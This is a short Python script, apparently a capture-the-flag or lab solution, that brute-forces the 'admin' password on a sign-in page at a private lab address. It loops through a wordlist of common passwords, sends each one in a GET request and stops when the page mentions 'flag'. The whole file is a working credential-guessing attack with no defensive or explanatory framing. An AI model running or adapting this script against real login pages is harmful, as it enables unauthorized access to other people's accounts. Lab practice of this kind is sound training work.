import requests
import sys

BASE_URL = "http://192.168.56.101/index.php?page=signin"
USERNAME = "admin"
PASSWORD_FILE = "10k-most-common.txt"
SUCCESS_KEYWORD = "flag"

def check_flag(password):
    full_url = f"{BASE_URL}&username={USERNAME}&password={password}&Login=Login#"
    
    response = requests.get(full_url)
    if SUCCESS_KEYWORD in response.text.lower():
        print(f"Password found : {password}")
        sys.exit(0)

with open(PASSWORD_FILE, "r") as file:
    for password in file:
        password = password.strip()  # Delete spaces and /n
        print(password)
        check_flag(password)

print(f"No valid password in this file: {PASSWORD_FILE}.")

